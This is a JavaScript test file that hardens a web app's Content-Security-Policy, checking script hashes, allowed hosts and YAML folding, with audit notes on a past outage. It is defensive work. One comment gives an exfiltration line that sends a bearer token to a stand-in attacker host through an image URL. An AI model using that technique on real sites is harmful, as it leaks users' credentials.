// src/customHttp.csp.test.js
//
// M-7 (fresh-pass audit, Aug 2026) — script-src must not carry 'unsafe-inline'
// or 'unsafe-eval'. The one genuinely inline script (the pixel loader in
// index.html) is allowed via a SHA-256 hash instead of a blanket allowance;
// this test computes that hash itself from the live index.html content and
// asserts it's the exact one listed in customHttp.yml, so a future edit to
// the pixel-loader script that forgets to update the hash fails loudly here
// instead of silently breaking the pixel in production.
import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import crypto from 'node:crypto'

const read = (rel) => fs.readFileSync(new URL(rel, import.meta.url), 'utf8')

function pixelLoaderHash(html) {
  const marker = 'window.__ts360LoadPixel = function'
  const idx = html.indexOf(marker)
  const openTagEnd = html.lastIndexOf('<script>', idx) + '<script>'.length
  const closeTagStart = html.indexOf('</script>', idx)
  const content = html.slice(openTagEnd, closeTagStart)
  return 'sha256-' + crypto.createHash('sha256').update(content, 'utf8').digest('base64')
}

describe('Content-Security-Policy hardening (re-audit, M-7)', () => {
  const yml = read('../customHttp.yml')
  const html = read('../index.html')

  it('script-src does not carry unsafe-inline or unsafe-eval', () => {
    const scriptSrcLine = yml.split('\n').find((l) => l.trim().startsWith('script-src'))
    expect(scriptSrcLine).toBeTruthy()
    expect(scriptSrcLine).not.toMatch(/'unsafe-inline'/)
    expect(scriptSrcLine).not.toMatch(/'unsafe-eval'/)
  })

  it("script-src's pixel-loader hash matches index.html's actual inline script content", () => {
    const expectedHash = pixelLoaderHash(html)
    expect(yml).toContain(`'${expectedHash}'`)
  })

  // ── AUDIT H12 (second launch audit, Sep 2026) — THE GUARD THIS FILE CLAIMED TO HAVE ──
  //
  // customHttp.yml carries a note ending "src/customHttp.csp.test.js now fails on any
  // embedded newline." It did not. That note was written after the CSP was found missing
  // from production entirely — extra indentation on the connect-src lines of a YAML
  // folded block (>-) preserved 12 raw newlines, an HTTP header value cannot contain
  // them, and CloudFront dropped the header silently. Every other header applied
  // normally, and the unit test passed because it only read the file, never the value.
  //
  // So the file asserted protection that did not exist, which is worse than asserting
  // nothing: it invites the next person to trust it. These are the missing assertions.
  //
  // The mechanic to remember: in a YAML folded scalar, a line indented MORE than the
  // block's first line is kept literally AND its newline is preserved. Every
  // continuation line of the CSP value must sit at the same indent.
  // ── AUDIT M8 (second launch audit, Sep 2026) ──────────────────────────────
  describe('M8 — the policy grants nothing it does not use', () => {
    // Reuse the H12 parser below rather than maintain a second, weaker one: it walks
    // the folded block by indent, which is what actually defines the block's extent.
    const csp = () => {
      const lines = yml.split('\n')
      const at = lines.findIndex((l) => /^\s*-\s*key:\s*Content-Security-Policy\s*$/.test(l))
      const body = []
      let baseIndent = null
      for (let i = at + 2; i < lines.length; i++) {
        const line = lines[i]
        if (line.trim() === '') break
        const indent = line.length - line.trimStart().length
        if (baseIndent === null) baseIndent = indent
        if (indent < baseIndent || /^\s*-\s*key:/.test(line)) break
        body.push(line.trim())
      }
      return body.join(' ')
    }

    it('img-src no longer permits arbitrary https hosts', () => {
      // `img-src https:` is an open exfiltration channel: new Image().src =
      // 'https://attacker/' + token needs no fetch and no CORS. That is the exfil half
      // of H5, whose bearer token is readable from page JavaScript.
      const directive = csp().match(/img-src[^;]*/)[0]
      expect(directive).not.toMatch(/(^|\s)https:(\s|$)/)
      expect(directive).toMatch(/'self'/)
      expect(directive).toMatch(/data:/)
      expect(directive).toMatch(/blob:/)
      // The Meta pixel's beacon is the one external image the product actually loads.
      expect(directive).toContain('https://www.facebook.com')
    })

    it('connect-src lists no host without a code path', () => {
      // Each of these lost its caller: provider OAuth moved server-side, and the
      // web3forms key moved behind POST /alerts/form-relay (integrations.js, OBS-5).
      const directive = csp().match(/connect-src[^;]*/)[0]
      for (const dead of [
        'quickbooks.api.intuit.com', 'api.xero.com', 'api.wave.com',
        'api.freshbooks.com', 'api.web3forms.com',
        // FRESH-EYES F-16: serves the pixel SCRIPT (script-src); never an event destination.
        'connect.facebook.net',
      ]) {
        expect(directive, `${dead} has no remaining code path`).not.toContain(dead)
      }
    })

    it('connect-src still lists every host that IS used', () => {
      // The failure mode in the other direction — over-pruning breaks the product.
      const directive = csp().match(/connect-src[^;]*/)[0]
      for (const live of [
        "'self'", 'https://app.taxstat360.com', 'https://api.stripe.com',
        'https://taxstat360.us4.list-manage.com', 'https://www.facebook.com',
      ]) {
        expect(directive, `${live} is still in use`).toContain(live)
      }
    })

    it('frame-ancestors is present alongside X-Frame-Options', () => {
      // X-Frame-Options: DENY covers legacy browsers; frame-ancestors is what modern
      // browsers actually honour, and it was absent entirely.
      expect(csp()).toMatch(/frame-ancestors 'none'/)
      expect(yml).toMatch(/X-Frame-Options[\s\S]{0,40}DENY/)
    })
  })

  describe('H12 — the folded CSP value must fold to a single line', () => {
    // Parse the folded block by hand rather than adding a YAML dependency: read from the
    // `value: >-` marker to the next key at the same or lower indent.
    const foldedCspValue = () => {
      const lines = yml.split('\n')
      const at = lines.findIndex((l) => /^\s*-\s*key:\s*Content-Security-Policy\s*$/.test(l))
      expect(at, 'Content-Security-Policy key not found in customHttp.yml').toBeGreaterThan(-1)
      const valueLine = lines[at + 1]
      expect(valueLine, 'CSP value must use a folded scalar').toMatch(/value:\s*>-\s*$/)
      const body = []
      let baseIndent = null
      for (let i = at + 2; i < lines.length; i++) {
        const line = lines[i]
        if (line.trim() === '') break
        const indent = line.length - line.trimStart().length
        if (baseIndent === null) baseIndent = indent
        // A line at or below the block's opening indent ends the block.
        if (indent < baseIndent) break
        if (/^\s*-\s*key:/.test(line)) break
        body.push({ indent, text: line.trimStart() })
      }
      expect(body.length, 'CSP folded block appears empty').toBeGreaterThan(1)
      return { body, baseIndent }
    }

    it('every continuation line sits at the SAME indent as the first', () => {
      // This is the assertion that would have caught the production outage. A deeper
      // indent on any line turns a folded space into a preserved newline.
      const { body, baseIndent } = foldedCspValue()
      const offenders = body.filter((l) => l.indent !== baseIndent)
        .map((l) => `indent ${l.indent} (expected ${baseIndent}): ${l.text.slice(0, 60)}`)
      expect(offenders, 'over-indented lines embed a literal newline in the header value').toEqual([])
    })

    it('the folded value contains no newline once assembled', () => {
      const { body } = foldedCspValue()
      const folded = body.map((l) => l.text).join(' ')
      expect(folded).not.toMatch(/[\r\n]/)
      // Sanity: it should still be a real policy, not an empty string that trivially passes.
      expect(folded).toMatch(/^default-src/)
      expect(folded.length).toBeGreaterThan(200)
    })

    it('carries every directive the policy is supposed to ship', () => {
      const { body } = foldedCspValue()
      const folded = body.map((l) => l.text).join(' ')
      for (const d of [
        'default-src', 'script-src', 'style-src', 'font-src', 'img-src',
        'connect-src', 'frame-src', 'worker-src', 'object-src', 'base-uri',
        'form-action', 'upgrade-insecure-requests',
        'frame-ancestors',   // AUDIT M8 (Sep 2026)
      ]) {
        expect(folded, `missing directive: ${d}`).toContain(d)
      }
    })

    it('no OTHER folded header value is over-indented either', () => {
      // The same YAML trap applies to every `>-` block in this file, not just the CSP.
      const lines = yml.split('\n')
      const problems = []
      for (let i = 0; i < lines.length; i++) {
        if (!/value:\s*>-\s*$/.test(lines[i])) continue
        let baseIndent = null
        for (let j = i + 1; j < lines.length; j++) {
          const line = lines[j]
          if (line.trim() === '' || /^\s*-\s*key:/.test(line)) break
          const indent = line.length - line.trimStart().length
          if (baseIndent === null) { baseIndent = indent; continue }
          if (indent < baseIndent) break
          if (indent !== baseIndent) problems.push(`line ${j + 1}: ${line.trimStart().slice(0, 50)}`)
        }
      }
      expect(problems).toEqual([])
    })
  })
})
